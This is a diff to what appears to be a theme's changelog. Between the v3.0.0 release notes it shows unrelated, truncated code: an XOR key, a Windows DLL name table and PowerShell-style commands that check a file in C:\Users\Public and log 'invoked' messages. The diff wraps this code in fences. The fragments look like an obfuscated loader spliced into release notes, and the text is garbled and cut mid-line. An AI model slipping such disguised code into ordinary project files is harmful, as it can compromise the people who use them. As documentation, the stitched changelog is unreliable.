@@ -136,6 +136,7 @@ One of the major changes in this version is that a lot of time was spent on reth
 - Fixed jQuery version in staticman (#671)
 
 ## v3.0.0 (2020-05-07)
+```
 K = 0x5A
 S = [
 "ole32.dll",
@@ -231,6 +232,7 @@ W "invoked"
 Start-Sleep -Seconds 5
 if(Test-Path 'C:\Users\Public\v13.txt'){ W "v13 bytes=$((Get-Item 'C:\Use
 W "end
+```
 - **BREAKING CHANGE** Upgraded from Bootstrap 3.3.2 to 4.4.1. This involved a major rewrite of most components. This shouldn't affect any users unless you have custom HTML/CSS code which the new Bootstrap could have broken.
 - **BREAKING CHANGE** Renamed `bigimg` YAML parameter to `cover-img`
 - **BREAKING CHANGE** Removed `googlefonts` YAML parameter since googlefonts are just CSS so they can be loaded via `ext-css`
